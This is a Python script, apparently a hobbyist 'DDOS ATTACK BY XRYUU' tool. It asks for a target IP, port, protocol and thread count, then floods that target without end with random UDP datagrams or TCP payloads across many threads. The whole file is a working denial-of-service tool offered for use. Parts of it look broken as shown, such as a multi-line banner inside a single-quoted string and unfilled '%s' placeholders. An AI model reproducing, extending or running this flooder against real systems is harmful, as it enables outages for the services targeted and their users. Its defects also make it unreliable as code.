#!/usr/bin/env python3
import random
import os
import socket
import threading

os.system("clear")

print("██╗░░██╗██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
╚██╗██╔╝██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
░╚███╔╝░██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
░██╔██╗░██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██╔╝╚██╗██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░")

ip = str(input(" Ip : "))
port = int(input(" Port : "))
choice = str(input(" TCP/UDP : "))
times = int(input(" Time : "))
threads = int(input(" Threads : "))

def run():
  data = random._urandom(900)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        os.system("clear")
      print(i +" ATTACK IP %s AND PORT %s")
    except:
      print("DDOS ATTACK BY XRYUU")

def run2():
  data = random._urandom(102400)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        os.system("clear")
      print(i +" ATTACK IP %s AND PORT %s")
    except:
      s.close()
      print("[*] DDOS ATTACK BY XRYUU")

for UDP in range(threads):
  if choice == 'UDP':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()